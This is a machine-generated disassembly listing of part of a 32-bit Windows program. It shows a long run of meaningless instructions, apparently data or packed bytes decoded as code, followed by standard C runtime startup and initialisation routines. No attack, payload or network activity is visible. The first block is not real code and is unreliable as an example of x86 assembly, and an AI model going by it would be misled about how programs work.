  422451:	mov    eax,ecx
  422453:	jecxz  0x42248d
  422455:	(bad)  
  422456:	pushf  
  422457:	cmp    al,0x92
  422459:	xor    DWORD PTR [ebx+esi*4],edi
  42245c:	mov    BYTE PTR [edx],ah
  42245e:	outs   dx,DWORD PTR ds:[esi]
  42245f:	jmp    0xab3f:0x57919ef6
  422466:	mov    dl,0x93
  422468:	in     eax,dx
  422469:	data16 lods al,BYTE PTR ds:[esi]
  42246b:	test   eax,0x69280f87
  422470:	fidiv  WORD PTR [esi-0x2e593b95]
  422476:	aaa    
  422477:	mov    al,0x43
  422479:	pop    ds
  42247a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42247b:	inc    esp
  42247c:	addr16 enter 0x1eeb,0x5c
  422481:	in     al,0x2a
  422483:	sbb    edx,ebx
  422485:	dec    ecx
  422486:	cmp    ecx,DWORD PTR [edx+0x183cdebd]
  42248c:	inc    edi
  42248d:	sub    edi,DWORD PTR [ebx]
  42248f:	xor    eax,0x5b2d577
  422494:	jmp    0xff25:0xd5ea4490
  42249b:	cmp    BYTE PTR [esi-0x1b],0x70
  42249f:	push   cs
  4224a0:	push   0x6de9ceb8
  4224a5:	loopne 0x422467
  4224a7:	shr    eax,1
  4224a9:	sub    BYTE PTR [ebx+0x58f44f02],bl
  4224af:	cld    
  4224b0:	adc    al,al
  4224b2:	fdiv   st(3),st
  4224b4:	inc    esi
  4224b5:	or     DWORD PTR [edi],ecx
  4224b7:	xor    DWORD PTR [ebx+0x39],ebx
  4224ba:	mov    ch,0x18
  4224bc:	arpl   WORD PTR [ecx+esi*8-0x53],dx
  4224c0:	sub    DWORD PTR [edi+0x1626dcfa],ecx
  4224c6:	jbe    0x422545
  4224c8:	lahf   
  4224c9:	sahf   
  4224ca:	mov    ds:0xbdc7e10d,al
  4224cf:	push   ecx
  4224d0:	call   0x6906:0x21ca509b
  4224d7:	jecxz  0x4224d2
  4224d9:	push   esp
  4224da:	add    eax,0xe455f7b4
  4224df:	and    eax,DWORD PTR [edi]
  4224e1:	inc    ebp
  4224e2:	inc    edx
  4224e3:	sar    DWORD PTR [ebx-0x79020d78],0xd7
  4224ea:	iret   
  4224eb:	push   ebp
  4224ec:	cmp    ecx,DWORD PTR [esi-0x379371f8]
  4224f2:	mov    edx,0x8bd33572
  4224f7:	dec    edi
  4224f8:	xchg   ebx,eax
  4224f9:	cmc    
  4224fa:	mov    ds:0x188eb29c,eax
  4224ff:	xchg   esi,eax
  422500:	xchg   ebx,eax
  422501:	xor    ecx,esp
  422503:	mov    ch,0x61
  422505:	data16 repnz gs repz mov dl,0x72
  42250b:	push   ss
  42250c:	push   esi
  42250d:	das    
  42250e:	sti    
  42250f:	push   esi
  422510:	add    DWORD PTR [ebx+0x21],esi
  422513:	pop    esi
  422514:	loope  0x422580
  422516:	inc    ecx
  422517:	jmp    0x422577
  422519:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42251a:	lods   al,BYTE PTR ds:[esi]
  42251b:	add    BYTE PTR [ebp+0x1],bl
  42251e:	mov    ds:0x84320bbb,al
  422523:	dec    esi
  422524:	mov    bh,0x9d
  422526:	imul   esi,DWORD PTR [ebp-0x3d],0x31
  42252a:	std    
  42252b:	or     eax,0x66580c52
  422530:	xchg   ebp,eax
  422531:	xchg   esp,eax
  422532:	push   ebp
  422533:	in     al,0x2
  422535:	aaa    
  422536:	push   bx
  422538:	test   bl,0xbf
  42253b:	fdivrp st(0),st
  42253d:	mov    ah,0x78
  42253f:	stos   DWORD PTR es:[edi],eax
  422540:	jecxz  0x422580
  422542:	(bad)  
  422543:	push   ebp
  422544:	in     eax,dx
  422545:	sub    al,0xc4
  422547:	dec    ebp
  422548:	gs jge 0x42259a
  42254b:	xchg   edx,eax
  42254c:	xchg   edx,eax
  42254d:	rcr    eax,1
  42254f:	outs   dx,BYTE PTR ds:[esi]
  422550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422551:	pop    es
  422552:	rol    DWORD PTR [ebp-0x57488e6a],0x1b
  422559:	or     esi,0xbbcd7183
  42255f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422560:	jns    0x4225dd
  422562:	mov    al,0x20
  422564:	fld    QWORD PTR [ebx+0x2]
  422567:	cmp    edi,DWORD PTR [eax-0x62]
  42256a:	or     ch,BYTE PTR [ebx+0xc]
  42256d:	test   DWORD PTR [esi-0x5eaeb9b9],edx
  422573:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  422575:	sub    eax,0x219c9f6f
  42257a:	ins    DWORD PTR es:[edi],dx
  42257b:	xor    cl,bh
  42257d:	into   
  42257e:	int3   
  42257f:	out    dx,al
  422580:	fisttp WORD PTR [ebp+eiz*4+0x18]
  422584:	mov    ecx,0xf2860bfa
  422589:	add    DWORD PTR [edx+esi*1],0xffffff97
  42258d:	xchg   esi,eax
  42258e:	dec    edx
  42258f:	xor    al,0xb3
  422591:	repnz in eax,dx
  422593:	lock sbb BYTE PTR [ebx],0x45
  422597:	jp     0x42258c
  422599:	xchg   ecx,eax
  42259a:	leave  
  42259b:	scas   al,BYTE PTR es:[edi]
  42259c:	jmp    0x2bed:0x9e92d082
  4225a3:	aas    
  4225a4:	out    0x42,eax
  4225a6:	or     edx,DWORD PTR [edx]
  4225a8:	(bad)  
  4225a9:	mov    ds:0x2d18d797,al
  4225ae:	mov    bh,0x7
  4225b0:	(bad)
  4225b4:	ja     0x42260e
  4225b6:	int    0x51
  4225b8:	jae    0x4225a2
  4225ba:	add    dl,dh
  4225bc:	mov    bh,0x9a
  4225be:	rcl    DWORD PTR [edx-0x2b],0x5f
  4225c2:	mov    edi,edi
  4225c4:	pop    ds
  4225c5:	sbb    DWORD PTR [edx+ebp*2-0x3651baef],0x49
  4225cd:	stos   DWORD PTR es:[edi],eax
  4225ce:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225d0:	pop    DWORD PTR [eax]
  4225d2:	inc    esp
  4225d3:	bound  eax,QWORD PTR [ebp+0xbd0e748]
  4225d9:	mov    esp,0x9bcee281
  4225de:	jo     0x422614
  4225e0:	push   0x62
  4225e2:	mov    bl,0x45
  4225e4:	mov    esp,ss
  4225e6:	jl     0x422646
  4225e8:	loopne 0x4225df
  4225ea:	add    BYTE PTR [eax+0x6e],ch
  4225ed:	fstp   QWORD PTR [edi+esi*8]
  4225f0:	leave  
  4225f1:	mov    ebx,0xb8f74d48
  4225f6:	or     bh,BYTE PTR [edi]
  4225f8:	(bad)  
  4225f9:	sbb    BYTE PTR [eax-0x7830193b],al
  4225ff:	inc    ebx
  422600:	dec    eax
  422601:	push   edx
  422602:	sub    DWORD PTR [edi+0x5ea7415a],eax
  422608:	or     DWORD PTR [eax+edi*1+0x57],0x62c1964b
  422610:	and    ecx,DWORD PTR [edx-0x7619e5b3]
  422616:	aad    0x0
  422618:	rcr    DWORD PTR [eax-0x40],1
  42261b:	iret   
  42261c:	mov    al,ds:0x6b69f1c6
  422621:	inc    eax
  422622:	mov    ds:0x227b826,al
  422627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422628:	mov    ecx,0x74d0389e
  42262d:	inc    ecx
  42262e:	in     al,0x6c
  422630:	sbb    BYTE PTR [ebx-0x52],bh
  422633:	fs dec ebx
  422635:	test   al,0xee
  422637:	loope  0x4225f7
  422639:	fcomp  QWORD PTR [esi+0x6b1ea78d]
  42263f:	clc    
  422640:	push   edx
  422641:	test   BYTE PTR [ebx+0x51],al
  422644:	xor    edx,DWORD PTR [edx-0x77b6ae94]
  42264a:	jl     0x4225ea
  42264c:	and    al,0x67
  42264e:	rep outs dx,DWORD PTR ds:[esi]
  422650:	xchg   BYTE PTR [edi+0x5f],ch
  422653:	mov    al,0xd
  422655:	cmc    
  422656:	fdivr  st(4),st
  422658:	pop    ecx
  422659:	adc    cl,BYTE PTR [ebx-0x4d90deb9]
  42265f:	pop    ebx
  422660:	mov    BYTE PTR [edi-0x3a],0x32
  422664:	shr    al,1
  422666:	dec    esp
  422667:	std    
  422668:	ja     0x4226bc
  42266a:	loopne 0x422694
  42266c:	fild   QWORD PTR [eax+esi*8+0x12]
  422670:	leave  
  422671:	dec    edx
  422672:	inc    DWORD PTR [esi-0xbaa3f08]
  422678:	test   eax,0xca3939df
  42267d:	loopne 0x422626
  42267f:	add    al,0xb9
  422681:	lods   eax,DWORD PTR ds:[esi]
  422682:	data16 xor BYTE PTR [esp+ebx*4+0x44],ah
  422687:	sbb    bh,bh
  422689:	jo     0x4226f3
  42268b:	aam    0xc2
  42268d:	mov    DWORD PTR [edi],edi
  42268f:	jne    0x42268b
  422691:	inc    ecx
  422692:	ja     0x42267b
  422694:	sub    dh,BYTE PTR [edx+ecx*1-0x58]
  422698:	ror    ebp,1
  42269a:	outs   dx,BYTE PTR ds:[esi]
  42269b:	mov    BYTE PTR [edi+edi*1+0x28],bl
  42269f:	ins    BYTE PTR es:[edi],dx
  4226a0:	pop    ebp
  4226a1:	lahf   
  4226a2:	jb     0x422661
  4226a4:	push   eax
  4226a5:	mov    edx,0x79651838
  4226aa:	mov    eax,ds:0x7c9132a8
  4226af:	pop    ecx
  4226b0:	rol    DWORD PTR [ecx-0x5a],cl
  4226b3:	mov    cl,0xa8
  4226b5:	(bad)  
  4226b6:	mov    edx,0xcf3aa3ce
  4226bb:	leave  
  4226bc:	xchg   ebx,eax
  4226bd:	push   esp
  4226be:	aam    0x3a
  4226c0:	push   edx
  4226c1:	data16 mov bl,0x7a
  4226c4:	ss ds pop esi
  4226c7:	push   eax
  4226c8:	je     0x422677
  4226ca:	or     dh,BYTE PTR [ebx+0x6ffe8502]
  4226d0:	xchg   edi,eax
  4226d1:	mov    BYTE PTR [esi+eax*2+0x61],bh
  4226d5:	fdiv   st,st(7)
  4226d7:	test   eax,0x2c7341f7
  4226dc:	int    0x8b
  4226de:	cmc    
  4226df:	retf   0xbdc
  4226e2:	cmp    cl,BYTE PTR [esi]
  4226e4:	mov    WORD PTR [ecx+0xbb8ff26],?
  4226ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226eb:	out    dx,eax
  4226ec:	das    
  4226ed:	cmp    ebx,DWORD PTR [ebx+0x39]
  4226f0:	xor    al,0x35
  4226f2:	retf   0xc076
  4226f5:	mov    dh,0x2e
  4226f7:	xchg   esi,eax
  4226f8:	neg    BYTE PTR [esi+esi*8+0x17]
  4226fc:	sbb    BYTE PTR [ebp-0x6cba4268],bl
  422702:	enter  0x5b88,0xa9
  422706:	sub    al,0x93
  422708:	std    
  422709:	(bad)  
  42270a:	push   edi
  42270b:	cdq    
  42270c:	fdiv   DWORD PTR [ebx+0x3]
  42270f:	adc    DWORD PTR [edx-0x7eb0c240],0xd9ff1883
  422719:	push   0x4965de6e
  42271e:	mov    eax,ds:0x4ccb2d80
  422723:	dec    edx
  422724:	test   DWORD PTR [edx],0xdda59419
  42272a:	sbb    edi,ebp
  42272c:	sub    esp,DWORD PTR [eax]
  42272e:	jle    0x4226e9
  422730:	add    eax,0x25f8e03d
  422735:	xchg   edi,eax
  422736:	push   es
  422737:	aam    0x5a
  422739:	mov    DWORD PTR [edx+0x2758a2f5],ecx
  42273f:	cmc    
  422740:	inc    esi
  422741:	sbb    ecx,DWORD PTR [eax-0x71900f7f]
  422747:	pop    ds
  422748:	mov    ebx,DWORD PTR [edi*2-0x357170ab]
  42274f:	push   edx
  422750:	out    0x7c,eax
  422752:	das    
  422753:	std    
  422754:	cdq    
  422755:	(bad)  
  422756:	pusha  
  422757:	(bad)  
  422758:	cdq    
  422759:	adc    eax,0xdd441dea
  42275e:	add    DWORD PTR [edi+ebp*8-0x59],ebx
  422762:	pop    ss
  422763:	adc    al,BYTE PTR [ebp-0x6e961462]
  422769:	fild   WORD PTR [ebx]
  42276b:	mov    ch,0xed
  42276d:	add    dl,bl
  42276f:	int3   
  422770:	std    
  422771:	pusha  
  422772:	ins    DWORD PTR es:[edi],dx
  422773:	in     eax,0xfd
  422775:	xchg   ebp,eax
  422776:	fisttp DWORD PTR [edx+0x21]
  422779:	cli    
  42277a:	mov    WORD PTR [ebx],es
  42277c:	xor    eax,ecx
  42277e:	push   es
  42277f:	xor    al,0x2d
  422781:	adc    al,0x77
  422783:	pop    edi
  422784:	dec    ebx
  422785:	outs   dx,DWORD PTR ds:[esi]
  422786:	pop    eax
  422787:	and    eax,0xdf0e1661
  42278c:	ja     0x422759
  42278e:	fadd   st(7),st
  422790:	fstp   QWORD PTR [esp+ebx*4+0x1f]
  422794:	ins    BYTE PTR es:[edi],dx
  422795:	or     eax,0x82b4a8da
  42279a:	jne    0x42278e
  42279c:	fld    DWORD PTR [edx]
  42279e:	and    al,BYTE PTR [ecx]
  4227a0:	and    esp,esp
  4227a2:	xchg   DWORD PTR [ecx-0x4b88a4ba],eax
  4227a8:	bswap  edx
  4227aa:	cmp    ecx,DWORD PTR [ecx-0x79d2e05f]
  4227b0:	inc    ebp
  4227b1:	adc    eax,0x9668a0dc
  4227b6:	dec    edi
  4227b7:	sub    edx,DWORD PTR [edx-0x1f]
  4227ba:	mov    eax,ds:0xa23a376d
  4227bf:	pop    edi
  4227c0:	xchg   edx,eax
  4227c1:	cli    
  4227c2:	mov    al,BYTE PTR ds:0xa157c752
  4227c8:	and    BYTE PTR [ebp+0x21],bl
  4227cb:	scas   eax,DWORD PTR es:[edi]
  4227cc:	xchg   ebx,eax
  4227cd:	add    dl,BYTE PTR [edi]
  4227cf:	xchg   esi,eax
  4227d0:	add    eax,0x1bab0139
  4227d5:	or     eax,DWORD PTR [edi-0x79]
  4227d8:	loop   0x4227b3
  4227da:	pop    ebx
  4227db:	jge    0x42278c
  4227dd:	out    dx,al
  4227de:	push   esp
  4227df:	cmc    
  4227e0:	mov    ebx,0xd3be320e
  4227e5:	push   0xf64fbe1f
  4227ea:	nop
  4227eb:	cmp    DWORD PTR [ebx+0x772a353e],0xffffff9e
  4227f2:	xor    al,0x9
  4227f4:	fstp   TBYTE PTR [edi]
  4227f6:	jl     0x4227bf
  4227f8:	push   0xffffff82
  4227fa:	pop    esi
  4227fb:	sbb    DWORD PTR ds:[edx-0x6e],esi
  4227ff:	push   es
  422800:	xchg   BYTE PTR [ecx-0x52cd4f3e],bh
  422806:	out    0x71,eax
  422808:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422809:	dec    ecx
  42280a:	adc    edi,esi
  42280c:	lods   eax,DWORD PTR ds:[esi]
  42280d:	arpl   si,di
  42280f:	jno    0x422887
  422811:	in     al,0xe0
  422813:	push   cs
  422814:	sbb    BYTE PTR [ebx],0x72
  422817:	into   
  422818:	and    bh,0x71
  42281b:	mov    ch,0x7b
  42281d:	out    0xce,eax
  42281f:	push   ebx
  422820:	rcr    BYTE PTR [eax-0x36258ef],1
  422826:	scas   al,BYTE PTR es:[edi]
  422827:	and    esp,DWORD PTR [ebx-0x1a]
  42282a:	inc    ebp
  42282b:	ja     0x42288c
  42282d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42282e:	test   eax,0x3efcfde9
  422833:	adc    eax,0xb10b8064
  422838:	fs repz sbb eax,0x6d
  42283d:	add    ch,BYTE PTR [ecx+0x79]
  422840:	ret    0x15fd
  422843:	mov    ds:0x82a54ef6,al
  422848:	sub    al,0x29
  42284a:	jnp    0x4227ce
  42284c:	mov    edi,edi
  42284e:	in     al,dx
  42284f:	popa   
  422850:	loop   0x42288e
  422852:	mov    BYTE PTR [ecx-0x85ef9ee],cl
  422858:	push   edx
  422859:	bound  ebp,QWORD PTR ds:0xceb3839b
  42285f:	pop    ebx
  422860:	mov    ds:0xc6a82919,al
  422865:	fimul  DWORD PTR [edx-0x47cab058]
  42286b:	icebp  
  42286c:	fwait
  42286d:	test   eax,0x5af0317
  422872:	xchg   esi,eax
  422873:	dec    esp
  422874:	aas    
  422875:	sub    edx,DWORD PTR [edx]
  422877:	adc    BYTE PTR [ebx+0x3c9102f0],cl
  42287d:	xlat   BYTE PTR ds:[ebx]
  42287e:	sub    al,0x1e
  422880:	(bad)  
  422881:	int    0xd7
  422883:	mov    al,0x52
  422885:	jmp    0x422906
  422887:	bnd jb 0x4228a8
  42288a:	je     0x42285b
  42288c:	test   eax,0x22846cb0
  422891:	mov    dl,0xb7
  422893:	sbb    al,0x1
  422895:	shr    DWORD PTR [eax+0x562568a6],0x5d
  42289c:	outs   dx,BYTE PTR ds:[esi]
  42289d:	fs fs out 0x76,al
  4228a1:	out    dx,al
  4228a2:	push   esi
  4228a3:	xor    eax,0x61c15056
  4228a8:	jmp    0x635e:0xd99eb1fd
  4228af:	sub    BYTE PTR [ecx+0x59],bl
  4228b2:	xor    al,0xf0
  4228b4:	mov    ebx,0x88a97de7
  4228b9:	lea    ebp,[edi-0x32]
  4228bc:	sbb    BYTE PTR [esi],dl
  4228be:	jno    0x422840
  4228c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228c1:	pop    ecx
  4228c2:	push   ebp
  4228c3:	jge    0x42284f
  4228c5:	(bad)  
  4228c6:	and    eax,0xb2320a6
  4228cb:	ror    BYTE PTR [edi+eiz*1],1
  4228ce:	(bad)  
  4228cf:	mov    edi,0xb1167692
  4228d4:	test   eax,0xe6628de
  4228d9:	enter  0x12a2,0xdd
  4228dd:	lock or DWORD PTR [edi+esi*1+0x19cfdf80],ecx
  4228e5:	into   
  4228e6:	mov    BYTE PTR [esi+ebx*8+0x2],ch
  4228ea:	and    al,BYTE PTR [edx]
  4228ec:	xor    BYTE PTR [ecx+0x10d2bd55],bh
  4228f2:	and    DWORD PTR [ecx],esp
  4228f4:	fs push edx
  4228f6:	adc    ecx,DWORD PTR [esi+0x11]
  4228f9:	outs   dx,DWORD PTR ds:[esi]
  4228fa:	mov    ds:0xb249f0d1,eax
  4228ff:	pop    es
  422900:	aaa    
  422901:	mov    eax,0x2c1fe001
  422906:	fisubr DWORD PTR [ecx]
  422908:	xchg   cl,dl
  42290a:	sbb    dh,BYTE PTR [edx]
  42290c:	ret    
  42290d:	pop    eax
  42290e:	dec    esp
  42290f:	icebp  
  422910:	aaa    
  422911:	(bad)  
  422912:	mov    bl,0xa
  422914:	mov    edx,0xbc9aa9c3
  422919:	inc    esi
  42291a:	dec    ecx
  42291b:	vmwrite edi,esi
  42291e:	mov    edx,0xa2f919b5
  422923:	dec    BYTE PTR ds:0xcf9d38c0
  422929:	cwde   
  42292a:	xchg   ebp,eax
  42292b:	mov    ah,0x25
  42292d:	or     DWORD PTR [ecx],esp
  42292f:	hlt    
  422930:	shr    al,1
  422932:	sbb    DWORD PTR [esi+eax*8-0x4667fc24],0x6
  42293a:	sub    BYTE PTR [eax+eiz*8],al
  42293d:	(bad)  
  42293e:	shl    BYTE PTR [esi-0x64f32049],1
  422944:	cwde   
  422945:	and    dl,BYTE PTR [ecx+0x4c]
  422948:	xchg   ecx,eax
  422949:	xchg   ebx,ecx
  42294b:	jno    0x42293c
  42294d:	jae    0x4228dd
  42294f:	pop    ss
  422950:	int    0x5b
  422952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422953:	out    dx,al
  422954:	fwait
  422955:	xchg   esp,eax
  422956:	out    0x40,eax
  422958:	loopne 0x42298e
  42295a:	xor    eax,eax
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
